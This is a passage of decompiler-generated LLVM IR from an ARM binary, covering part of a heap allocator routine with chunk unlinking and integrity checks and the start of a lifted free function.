  store i32 %v1_1421825, i32* %v3_1422027, align 4
  %v0_1422428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1422429 = add i32 %v0_1422428, 12
  %v3_1422430 = inttoptr i32 %v2_1422429 to i32*
  store i32 %v0_1422428, i32* %v3_1422430, align 4
  br label %dec_label_pc_14210.dec_label_pc_14210_crit_edge

dec_label_pc_140ec:                               ; preds = %entry
  %v1_140ec = and i32 %v2_140d4, -3
  %v3_140f0 = udiv i32 %v2_140d4, 8
  store i32 %v3_140f0, i32* %r2.global-to-local, align 4
  store i32 %v1_140ec, i32* %v1_140d4, align 4
  %v0_140f8 = load i32, i32* @r0, align 4
  %v1_140f8 = add i32 %v0_140f8, -4
  store i32 %v1_140f8, i32* %r3.global-to-local, align 4
  %v1_140fc = load i32, i32* %r2.global-to-local, align 4
  %v4_140fc = mul i32 %v1_140fc, 4
  %v5_140fc = add i32 %v4_140fc, %v1_140f8
  store i32 %v5_140fc, i32* %sb.global-to-local, align 4
  %v1_14100 = add i32 %v0_140f8, 52
  store i32 %v1_14100, i32* %r7.global-to-local, align 4
  %v1_14104 = add i32 %v0_140f8, 4
  store i32 %v1_14104, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1410c

dec_label_pc_1410c:                               ; preds = %dec_label_pc_14208, %dec_label_pc_140ec
  %v1_1420010 = phi i32 [ %v1_14200, %dec_label_pc_14208 ], [ %v5_140fc, %dec_label_pc_140ec ]
  %v1_14118 = phi i32 [ %v1_14208, %dec_label_pc_14208 ], [ %v1_14104, %dec_label_pc_140ec ]
  %v1_1410c = inttoptr i32 %v1_14118 to i32*
  %v2_1410c = load i32, i32* %v1_1410c, align 4
  store i32 %v2_1410c, i32* %r1.global-to-local, align 4
  %v2_14110 = icmp eq i32 %v2_1410c, 0
  br i1 %v2_14110, label %dec_label_pc_14200, label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_1410c
  %v0_14118 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14118, i32* %v1_1410c, align 4
  %v0_1411c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_141f4, %dec_label_pc_14118
  %v0_14138 = phi i32 [ %v0_141f4, %dec_label_pc_141f4 ], [ %v0_1411c.pre, %dec_label_pc_14118 ]
  %v1_1411c = add i32 %v0_14138, 4
  %v2_1411c = inttoptr i32 %v1_1411c to i32*
  %v3_1411c = load i32, i32* %v2_1411c, align 4
  store i32 %v3_1411c, i32* %r3.global-to-local, align 4
  %v1_14120 = and i32 %v3_1411c, -2
  store i32 %v1_14120, i32* %lr.global-to-local, align 4
  %v2_14124 = add i32 %v1_14120, %v0_14138
  store i32 %v2_14124, i32* @r0, align 4
  %v1_14128 = urem i32 %v3_1411c, 2
  %v2_14128 = icmp eq i32 %v1_14128, 0
  %v1_1412c = add i32 %v0_14138, 8
  %v2_1412c = inttoptr i32 %v1_1412c to i32*
  %v3_1412c = load i32, i32* %v2_1412c, align 4
  store i32 %v3_1412c, i32* %sl.global-to-local, align 4
  %v1_14130 = add i32 %v2_14124, 4
  %v2_14130 = inttoptr i32 %v1_14130 to i32*
  %v3_14130 = load i32, i32* %v2_14130, align 4
  store i32 %v3_14130, i32* %r8.global-to-local, align 4
  br i1 %v2_14128, label %dec_label_pc_14138, label %dec_label_pc_1416c

dec_label_pc_14138:                               ; preds = %dec_label_pc_1411c
  %v1_14138 = inttoptr i32 %v0_14138 to i32*
  %v2_14138 = load i32, i32* %v1_14138, align 4
  store i32 %v2_14138, i32* %r5.global-to-local, align 4
  %v2_1413c = sub i32 %v0_14138, %v2_14138
  store i32 %v2_1413c, i32* %r3.global-to-local, align 4
  %v1_14140 = add i32 %v2_1413c, 8
  %v2_14140 = inttoptr i32 %v1_14140 to i32*
  %v3_14140 = load i32, i32* %v2_14140, align 4
  store i32 %v3_14140, i32* @ip, align 4
  %v1_14144 = add i32 %v3_14140, 12
  %v2_14144 = inttoptr i32 %v1_14144 to i32*
  %v3_14144 = load i32, i32* %v2_14144, align 4
  store i32 %v3_14144, i32* %r1.global-to-local, align 4
  %v9_14148 = icmp eq i32 %v3_14144, %v2_1413c
  %v1_1414c = add i32 %v2_1413c, 12
  %v2_1414c = inttoptr i32 %v1_1414c to i32*
  %v3_1414c = load i32, i32* %v2_1414c, align 4
  store i32 %v3_1414c, i32* %r2.global-to-local, align 4
  br i1 %v9_14148, label %dec_label_pc_14154, label %dec_label_pc_141b0

dec_label_pc_14154:                               ; preds = %dec_label_pc_14138
  %v1_14154 = add i32 %v3_1414c, 8
  %v2_14154 = inttoptr i32 %v1_14154 to i32*
  %v3_14154 = load i32, i32* %v2_14154, align 4
  store i32 %v3_14154, i32* %r3.global-to-local, align 4
  %v9_14158 = icmp eq i32 %v3_14154, %v2_1413c
  br i1 %v9_14158, label %dec_label_pc_14160, label %dec_label_pc_141b0

dec_label_pc_14160:                               ; preds = %dec_label_pc_14154
  store i32 %v3_14140, i32* %v2_14154, align 4
  %v0_14164 = load i32, i32* %r2.global-to-local, align 4
  %v1_14164 = load i32, i32* @ip, align 4
  %v2_14164 = add i32 %v1_14164, 12
  %v3_14164 = inttoptr i32 %v2_14164 to i32*
  store i32 %v0_14164, i32* %v3_14164, align 4
  %v0_14168 = load i32, i32* %lr.global-to-local, align 4
  %v1_14168 = load i32, i32* %r5.global-to-local, align 4
  %v2_14168 = add i32 %v1_14168, %v0_14168
  store i32 %v2_14168, i32* %lr.global-to-local, align 4
  %v0_14170.pre = load i32, i32* @r0, align 4
  %v0_14174.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_14160
  %v0_141e4 = phi i32 [ %v1_14120, %dec_label_pc_1411c ], [ %v2_14168, %dec_label_pc_14160 ]
  %v0_14174 = phi i32 [ %v3_14130, %dec_label_pc_1411c ], [ %v0_14174.pre, %dec_label_pc_14160 ]
  %v1_14188 = phi i32 [ %v2_14124, %dec_label_pc_1411c ], [ %v0_14170.pre, %dec_label_pc_14160 ]
  %v0_1416c = load i32, i32* @r4, align 4
  %v1_1416c = add i32 %v0_1416c, 44
  %v2_1416c = inttoptr i32 %v1_1416c to i32*
  %v3_1416c = load i32, i32* %v2_1416c, align 4
  store i32 %v3_1416c, i32* %r3.global-to-local, align 4
  %v9_14170 = icmp eq i32 %v1_14188, %v3_1416c
  %v1_14174 = and i32 %v0_14174, -4
  store i32 %v1_14174, i32* %r5.global-to-local, align 4
  br i1 %v9_14170, label %dec_label_pc_141e4, label %dec_label_pc_1417c

dec_label_pc_1417c:                               ; preds = %dec_label_pc_1416c
  %v2_1417c = add i32 %v1_14188, %v1_14174
  store i32 %v2_1417c, i32* %r3.global-to-local, align 4
  %v1_14180 = add i32 %v2_1417c, 4
  %v2_14180 = inttoptr i32 %v1_14180 to i32*
  %v3_14180 = load i32, i32* %v2_14180, align 4
  store i32 %v3_14180, i32* %r3.global-to-local, align 4
  %v1_14184 = urem i32 %v3_14180, 2
  %v2_14184 = icmp eq i32 %v1_14184, 0
  %v2_14188 = add i32 %v1_14188, 4
  %v3_14188 = inttoptr i32 %v2_14188 to i32*
  store i32 %v1_14174, i32* %v3_14188, align 4
  br i1 %v2_14184, label %dec_label_pc_14190, label %dec_label_pc_1417c.dec_label_pc_141c0_crit_edge

dec_label_pc_1417c.dec_label_pc_141c0_crit_edge:  ; preds = %dec_label_pc_1417c
  %v0_141c4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_141c0

dec_label_pc_14190:                               ; preds = %dec_label_pc_1417c
  %v0_14190 = load i32, i32* @r0, align 4
  %v1_14190 = add i32 %v0_14190, 8
  %v2_14190 = inttoptr i32 %v1_14190 to i32*
  %v3_14190 = load i32, i32* %v2_14190, align 4
  store i32 %v3_14190, i32* @ip, align 4
  %v1_14194 = add i32 %v3_14190, 12
  %v2_14194 = inttoptr i32 %v1_14194 to i32*
  %v3_14194 = load i32, i32* %v2_14194, align 4
  store i32 %v3_14194, i32* %r3.global-to-local, align 4
  %v9_14198 = icmp eq i32 %v3_14194, %v0_14190
  %v1_1419c = add i32 %v0_14190, 12
  %v2_1419c = inttoptr i32 %v1_1419c to i32*
  %v3_1419c = load i32, i32* %v2_1419c, align 4
  store i32 %v3_1419c, i32* %r2.global-to-local, align 4
  br i1 %v9_14198, label %dec_label_pc_141a4, label %dec_label_pc_141b0

dec_label_pc_141a4:                               ; preds = %dec_label_pc_14190
  %v1_141a4 = add i32 %v3_1419c, 8
  %v2_141a4 = inttoptr i32 %v1_141a4 to i32*
  %v3_141a4 = load i32, i32* %v2_141a4, align 4
  store i32 %v3_141a4, i32* %r3.global-to-local, align 4
  %v9_141a8 = icmp eq i32 %v3_141a4, %v0_14190
  br i1 %v9_141a8, label %dec_label_pc_141b4, label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %dec_label_pc_14190, %dec_label_pc_14154, %dec_label_pc_14138, %dec_label_pc_141a4
  %v0_141b0 = call i32 @abort()
  store i32 %v0_141b0, i32* @r0, align 4
  %v0_141b4.pre = load i32, i32* @ip, align 4
  %v1_141b4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141b4:                               ; preds = %dec_label_pc_141a4, %dec_label_pc_141b0
  %v1_141b4 = phi i32 [ %v3_1419c, %dec_label_pc_141a4 ], [ %v1_141b4.pre, %dec_label_pc_141b0 ]
  %v0_141b4 = phi i32 [ %v3_14190, %dec_label_pc_141a4 ], [ %v0_141b4.pre, %dec_label_pc_141b0 ]
  %v2_141b4 = add i32 %v1_141b4, 8
  %v3_141b4 = inttoptr i32 %v2_141b4 to i32*
  store i32 %v0_141b4, i32* %v3_141b4, align 4
  %v0_141b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_141b8 = load i32, i32* @ip, align 4
  %v2_141b8 = add i32 %v1_141b8, 12
  %v3_141b8 = inttoptr i32 %v2_141b8 to i32*
  store i32 %v0_141b8, i32* %v3_141b8, align 4
  %v0_141bc = load i32, i32* %lr.global-to-local, align 4
  %v1_141bc = load i32, i32* %r5.global-to-local, align 4
  %v2_141bc = add i32 %v1_141bc, %v0_141bc
  store i32 %v2_141bc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %dec_label_pc_1417c.dec_label_pc_141c0_crit_edge, %dec_label_pc_141b4
  %v0_141c4 = phi i32 [ %v0_141c4.pre, %dec_label_pc_1417c.dec_label_pc_141c0_crit_edge ], [ %v2_141bc, %dec_label_pc_141b4 ]
  %v0_141c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_141c0 = add i32 %v0_141c0, 8
  %v2_141c0 = inttoptr i32 %v1_141c0 to i32*
  %v3_141c0 = load i32, i32* %v2_141c0, align 4
  store i32 %v3_141c0, i32* %r2.global-to-local, align 4
  %v1_141c4 = or i32 %v0_141c4, 1
  store i32 %v1_141c4, i32* %r3.global-to-local, align 4
  %v0_141c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_141c8, i32* %v2_141c0, align 4
  %v0_141cc = load i32, i32* %r1.global-to-local, align 4
  %v1_141cc = load i32, i32* %r2.global-to-local, align 4
  %v2_141cc = add i32 %v1_141cc, 12
  %v3_141cc = inttoptr i32 %v2_141cc to i32*
  store i32 %v0_141cc, i32* %v3_141cc, align 4
  %v0_141d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_141d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_141d0 = add i32 %v1_141d0, %v0_141d0
  %v4_141d0 = inttoptr i32 %v3_141d0 to i32*
  store i32 %v0_141d0, i32* %v4_141d0, align 4
  %v0_141d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_141d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_141d4 = add i32 %v1_141d4, 4
  %v3_141d4 = inttoptr i32 %v2_141d4 to i32*
  store i32 %v0_141d4, i32* %v3_141d4, align 4
  %v0_141d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_141d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_141d8 = add i32 %v1_141d8, 8
  %v3_141d8 = inttoptr i32 %v2_141d8 to i32*
  store i32 %v0_141d8, i32* %v3_141d8, align 4
  %v0_141dc = load i32, i32* %r7.global-to-local, align 4
  %v1_141dc = load i32, i32* %r1.global-to-local, align 4
  %v2_141dc = add i32 %v1_141dc, 12
  %v3_141dc = inttoptr i32 %v2_141dc to i32*
  store i32 %v0_141dc, i32* %v3_141dc, align 4
  br label %dec_label_pc_141f4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_1416c
  %v2_141e4 = add i32 %v1_14174, %v0_141e4
  %v1_141e8 = or i32 %v2_141e4, 1
  store i32 %v1_141e8, i32* %r3.global-to-local, align 4
  %v1_141ec = load i32, i32* %r1.global-to-local, align 4
  %v2_141ec = add i32 %v1_141ec, 4
  %v3_141ec = inttoptr i32 %v2_141ec to i32*
  store i32 %v1_141e8, i32* %v3_141ec, align 4
  %v0_141f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_141f0 = load i32, i32* @r4, align 4
  %v2_141f0 = add i32 %v1_141f0, 44
  %v3_141f0 = inttoptr i32 %v2_141f0 to i32*
  store i32 %v0_141f0, i32* %v3_141f0, align 4
  br label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141c0, %dec_label_pc_141e4
  %v0_141f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_141f4 = icmp eq i32 %v0_141f4, 0
  store i32 %v0_141f4, i32* %r1.global-to-local, align 4
  br i1 %v2_141f4, label %dec_label_pc_14200.loopexit, label %dec_label_pc_1411c

dec_label_pc_14200.loopexit:                      ; preds = %dec_label_pc_141f4
  %v0_14200.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14200.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14200

dec_label_pc_14200:                               ; preds = %dec_label_pc_14200.loopexit, %dec_label_pc_1410c
  %v1_14200 = phi i32 [ %v1_14200.pre, %dec_label_pc_14200.loopexit ], [ %v1_1420010, %dec_label_pc_1410c ]
  %v0_14208 = phi i32 [ %v0_14200.pre, %dec_label_pc_14200.loopexit ], [ %v1_14118, %dec_label_pc_1410c ]
  %v9_14200 = icmp eq i32 %v0_14208, %v1_14200
  br i1 %v9_14200, label %dec_label_pc_14278, label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %dec_label_pc_14200
  %v1_14208 = add i32 %v0_14208, 4
  store i32 %v1_14208, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1410c

dec_label_pc_14210.dec_label_pc_14210_crit_edge:  ; preds = %dec_label_pc_14210.preheader, %dec_label_pc_14210.dec_label_pc_14210_crit_edge
  %v0_14210.pre = load i32, i32* @r4, align 4
  %v1_14210.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14210 = mul i32 %v1_14210.pre, 8
  %v5_14210 = add i32 %v4_14210, %v0_14210.pre
  %v1_14214 = add i32 %v1_14210.pre, 1
  store i32 %v1_14214, i32* %r2.global-to-local, align 4
  %v1_14218 = add i32 %v5_14210, 44
  store i32 %v1_14218, i32* %r3.global-to-local, align 4
  %v2_14220 = add i32 %v5_14210, 52
  %v3_14220 = inttoptr i32 %v2_14220 to i32*
  store i32 %v1_14218, i32* %v3_14220, align 4
  %v0_14224 = load i32, i32* %r3.global-to-local, align 4
  %v2_14224 = add i32 %v0_14224, 12
  %v3_14224 = inttoptr i32 %v2_14224 to i32*
  store i32 %v0_14224, i32* %v3_14224, align 4
  %v7_14228 = icmp sgt i32 %v1_14214, 95
  br i1 %v7_14228, label %dec_label_pc_1422c, label %dec_label_pc_14210.dec_label_pc_14210_crit_edge

dec_label_pc_1422c:                               ; preds = %dec_label_pc_14210.dec_label_pc_14210_crit_edge
  %v0_1422c = load i32, i32* @r4, align 4
  %v1_1422c = inttoptr i32 %v0_1422c to i32*
  %v2_1422c = load i32, i32* %v1_1422c, align 4
  store i32 %v2_1422c, i32* %r2.global-to-local, align 4
  %v1_14230 = add i32 %v0_1422c, 864
  %v2_14230 = inttoptr i32 %v1_14230 to i32*
  %v3_14230 = load i32, i32* %v2_14230, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14238 = urem i32 %v2_1422c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_14240 = or i32 %v3_14230, 1
  store i32 %v1_14240, i32* %r1.global-to-local, align 4
  %v1_14244 = or i32 %v1_14238, 72
  store i32 %v1_14244, i32* %r2.global-to-local, align 4
  %v1_14248 = add i32 %v0_1422c, 52
  store i32 %v1_14248, i32* @ip, align 4
  %v2_1424c = add i32 %v0_1422c, 840
  %v3_1424c = inttoptr i32 %v2_1424c to i32*
  store i32 0, i32* %v3_1424c, align 4
  %v0_14250 = load i32, i32* %r3.global-to-local, align 4
  %v1_14250 = add i32 %v0_14250, 65536
  store i32 %v1_14250, i32* %r3.global-to-local, align 4
  %v0_14254 = load i32, i32* %r0.global-to-local, align 4
  %v1_14254 = load i32, i32* @r4, align 4
  %v2_14254 = add i32 %v1_14254, 836
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  store i32 %v0_14254, i32* %v3_14254, align 4
  %v0_14258 = load i32, i32* %r0.global-to-local, align 4
  %v1_14258 = load i32, i32* @r4, align 4
  %v2_14258 = add i32 %v1_14258, 844
  %v3_14258 = inttoptr i32 %v2_14258 to i32*
  store i32 %v0_14258, i32* %v3_14258, align 4
  %v1_1425c = load i32, i32* @r4, align 4
  %v2_1425c = add i32 %v1_1425c, 852
  %v3_1425c = inttoptr i32 %v2_1425c to i32*
  store i32 %v1_14250, i32* %v3_1425c, align 4
  %v1_14260 = load i32, i32* @r4, align 4
  %v2_14260 = add i32 %v1_14260, 864
  %v3_14260 = inttoptr i32 %v2_14260 to i32*
  store i32 %v1_14240, i32* %v3_14260, align 4
  %v1_14264 = load i32, i32* @r4, align 4
  %v2_14264 = inttoptr i32 %v1_14264 to i32*
  store i32 %v1_14244, i32* %v2_14264, align 4
  %v0_14268 = load i32, i32* @ip, align 4
  %v1_14268 = load i32, i32* @r4, align 4
  %v2_14268 = add i32 %v1_14268, 44
  %v3_14268 = inttoptr i32 %v2_14268 to i32*
  store i32 %v0_14268, i32* %v3_14268, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_14270 = call i32 @sysconf(i32 30, i32 %v1_14240, i32 %v1_14244, i32 %v1_14250)
  store i32 %v4_14270, i32* @r0, align 4
  %v1_14274 = load i32, i32* @r4, align 4
  %v2_14274 = add i32 %v1_14274, 860
  %v3_14274 = inttoptr i32 %v2_14274 to i32*
  store i32 %v4_14270, i32* %v3_14274, align 4
  br label %dec_label_pc_14278

dec_label_pc_14278:                               ; preds = %dec_label_pc_14200, %dec_label_pc_1422c
  %v2_1427c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1427c, i32* @r4, align 4
  %v1_14280 = load i32, i32* @r0, align 4
  ret i32 %v1_14280

; uselistorder directives
  uselistorder i32 %v0_1422c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14224, { 1, 0 }
  uselistorder i32 %v1_14208, { 1, 0 }
  uselistorder i32 %v0_141f4, { 0, 2, 1 }
  uselistorder i32 %v0_141d0, { 1, 0 }
  uselistorder i32 %v1_14120, { 1, 0, 2 }
  uselistorder i32 %v0_14138, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_140f8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 15, 0, 10, 6, 11, 7, 12, 8, 9, 13, 14, 2, 3, 4, 5 }
  uselistorder i32 95, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder label %dec_label_pc_14278, { 1, 0 }
  uselistorder label %dec_label_pc_14210.dec_label_pc_14210_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_141f4, { 1, 0 }
  uselistorder label %dec_label_pc_141c0, { 1, 0 }
  uselistorder label %dec_label_pc_141b4, { 1, 0 }
  uselistorder label %dec_label_pc_141b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1416c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14284 = load i32, i32* @r4, align 4
  %v6_14284 = load i32, i32* @r5, align 4
  %v9_14284 = load i32, i32* @r6, align 4
  %v12_14284 = load i32, i32* @r7, align 4
  %v18_14284 = load i32, i32* @lr, align 4
  %v0_1428c = load i32, i32* @r0, align 4
  store i32 %v0_1428c, i32* @r6, align 4
  %v2_1428c = icmp eq i32 %v0_1428c, 0
  %v2_14290 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r7, align 4
  br i1 %v2_1428c, label %dec_label_pc_14498, label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_142a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 108) to i32*), align 4
  store i32 %v4_142a0, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_142a0, i32* %r2.global-to-local, align 4
  %v4_142ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), align 4
  store i32 %v4_142ac, i32* %r1.global-to-local, align 4
  store i32 %v2_14290, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_142b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  store i32 %v4_142b8, i32* %ip.global-to-local, align 4
  store i32 82628, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_142b8)
  %v0_142c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_142c4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_142cc = load i32, i32* @r7, align 4
  %v2_142cc = add i32 %v0_142cc, 16
  %v3_142cc = inttoptr i32 %v2_142cc to i32*
  %v4_142cc = load i32, i32* %v3_142cc, align 4
  store i32 %v4_142cc, i32* %ip.global-to-local, align 4
  store i32 82648, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_142cc)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_142dc = load i32, i32* @r7, align 4
  %v2_142dc = add i32 %v0_142dc, 64
  %v3_142dc = inttoptr i32 %v2_142dc to i32*
  %v4_142dc = load i32, i32* %v3_142dc, align 4
  store i32 %v4_142dc, i32* @lr, align 4
  %v0_142e0 = load i32, i32* @r6, align 4
  %v1_142e0 = add i32 %v0_142e0, -4
  %v2_142e0 = inttoptr i32 %v1_142e0 to i32*
  %v3_142e0 = load i32, i32* %v2_142e0, align 4
  store i32 %v3_142e0, i32* %r2.global-to-local, align 4
  %v1_142e4 = inttoptr i32 %v4_142dc to i32*
  %v2_142e4 = load i32, i32* %v1_142e4, align 4
  store i32 %v2_142e4, i32* %r3.global-to-local, align 4
  %v1_142e8 = and i32 %v3_142e0, -4
  store i32 %v1_142e8, i32* %ip.global-to-local, align 4
  %v1_142ec = add i32 %v0_142e0, -8
  store i32 %v1_142ec, i32* @r5, align 4
  store i32 %v1_142ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_142e8, %v2_142e4
  br i1 %tmp, label %dec_label_pc_1431c, label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_1429c
  %v1_142fc = or i32 %v2_142e4, 3
  store i32 %v1_142fc, i32* %r3.global-to-local, align 4
  store i32 %v1_142fc, i32* %v1_142e4, align 4
  %v3_14300 = load i32, i32* @lr, align 4
  %v4_14300 = add i32 %v3_14300, -8
  store i32 %v4_14300, i32* %lr.global-to-local, align 4
  %v0_14304 = load i32, i32* %ip.global-to-local, align 4
  %v3_14304 = udiv i32 %v0_14304, 8
  store i32 %v3_14304, i32* %r1.global-to-local, align 4
  %v1_14308 = add i32 %v3_14300, -4
  store i32 %v1_14308, i32* %r2.global-to-local, align 4
  %v4_1430c = mul nuw i32 %v3_14304, 4
  %v5_1430c = add i32 %v4_1430c, %v1_14308
  %v6_1430c = inttoptr i32 %v5_1430c to i32*
  %v7_1430c = load i32, i32* %v6_1430c, align 4
  store i32 %v7_1430c, i32* %r3.global-to-local, align 4
  %v1_14310 = load i32, i32* @r5, align 4
  %v2_14310 = add i32 %v1_14310, 8
  %v3_14310 = inttoptr i32 %v2_14310 to i32*
  store i32 %v7_1430c, i32* %v3_14310, align 4
  %v0_14314 = load i32, i32* @r5, align 4
  %v1_14314 = load i32, i32* %r2.global-to-local, align 4
  %v2_14314 = load i32, i32* %r1.global-to-local, align 4
  %v5_14314 = mul i32 %v2_14314, 4
  %v6_14314 = add i32 %v5_14314, %v1_14314
  %v7_14314 = inttoptr i32 %v6_14314 to i32*
  store i32 %v0_14314, i32* %v7_14314, align 4
  br label %dec_label_pc_14480

dec_label_pc_1431c:                               ; preds = %dec_label_pc_1429c
  %v1_1431c = and i32 %v3_142e0, 2
  %v2_1431c = icmp eq i32 %v1_1431c, 0
  br i1 %v2_1431c, label %dec_label_pc_14324, label %dec_label_pc_14458

dec_label_pc_14324:                               ; preds = %dec_label_pc_1431c
  %v1_14324 = or i32 %v2_142e4, 1
  store i32 %v1_14324, i32* %r3.global-to-local, align 4
  store i32 %v1_14324, i32* %v1_142e4, align 4
  %v0_1432c = load i32, i32* @r6, align 4
  %v1_1432c = add i32 %v0_1432c, -4
  %v2_1432c = inttoptr i32 %v1_1432c to i32*
  %v3_1432c = load i32, i32* %v2_1432c, align 4
  store i32 %v3_1432c, i32* %r3.global-to-local, align 4
  %v0_14330 = load i32, i32* @r5, align 4
  %v1_14330 = load i32, i32* %ip.global-to-local, align 4
  %v2_14330 = add i32 %v1_14330, %v0_14330
  store i32 %v2_14330, i32* %lr.global-to-local, align 4
  %v1_14334 = urem i32 %v3_1432c, 2
  %v2_14334 = icmp eq i32 %v1_14334, 0
  %v1_14338 = add i32 %v2_14330, 4
  %v2_14338 = inttoptr i32 %v1_14338 to i32*
  %v3_14338 = load i32, i32* %v2_14338, align 4
  store i32 %v3_14338, i32* %r8.global-to-local, align 4
  br i1 %v2_14334, label %dec_label_pc_14340, label %dec_label_pc_14374

dec_label_pc_14340:                               ; preds = %dec_label_pc_14324
  %v1_14340 = add i32 %v0_1432c, -8
  %v2_14340 = inttoptr i32 %v1_14340 to i32*
  %v3_14340 = load i32, i32* %v2_14340, align 4
  store i32 %v3_14340, i32* %r1.global-to-local, align 4
  %v2_14344 = sub i32 %v0_14330, %v3_14340
  store i32 %v2_14344, i32* %r3.global-to-local, align 4
  %v1_14348 = add i32 %v2_14344, 8
  %v2_14348 = inttoptr i32 %v1_14348 to i32*
  %v3_14348 = load i32, i32* %v2_14348, align 4
  store i32 %v3_14348, i32* %r2.global-to-local, align 4
  %v1_1434c = add i32 %v3_14348, 12
  %v2_1434c = inttoptr i32 %v1_1434c to i32*
  %v3_1434c = load i32, i32* %v2_1434c, align 4
  store i32 %v3_1434c, i32* %r4.global-to-local, align 4
  %v9_14350 = icmp eq i32 %v3_1434c, %v2_14344
  %v1_14354 = add i32 %v2_14344, 12
  %v2_14354 = inttoptr i32 %v1_14354 to i32*
  %v3_14354 = load i32, i32* %v2_14354, align 4
  store i32 %v3_14354, i32* %r0.global-to-local, align 4
  br i1 %v9_14350, label %dec_label_pc_1435c, label %dec_label_pc_143c0

dec_label_pc_1435c:                               ; preds = %dec_label_pc_14340
  %v1_1435c = add i32 %v3_14354, 8
  %v2_1435c = inttoptr i32 %v1_1435c to i32*
  %v3_1435c = load i32, i32* %v2_1435c, align 4
  store i32 %v3_1435c, i32* %r3.global-to-local, align 4
  %v9_14360 = icmp eq i32 %v3_1435c, %v2_14344
  br i1 %v9_14360, label %dec_label_pc_14368, label %dec_label_pc_143c0

dec_label_pc_14368:                               ; preds = %dec_label_pc_1435c
  store i32 %v3_14348, i32* %v2_1435c, align 4
  %v0_1436c = load i32, i32* %r0.global-to-local, align 4
  %v1_1436c = load i32, i32* %r2.global-to-local, align 4
  %v2_1436c = add i32 %v1_1436c, 12
  %v3_1436c = inttoptr i32 %v2_1436c to i32*
  store i32 %v0_1436c, i32* %v3_1436c, align 4
  %v0_14370 = load i32, i32* %ip.global-to-local, align 4
  %v1_14370 = load i32, i32* %r1.global-to-local, align 4
  %v2_14370 = add i32 %v1_14370, %v0_14370
  store i32 %v2_14370, i32* %ip.global-to-local, align 4
  %v0_14380.pre = load i32, i32* %lr.global-to-local, align 4
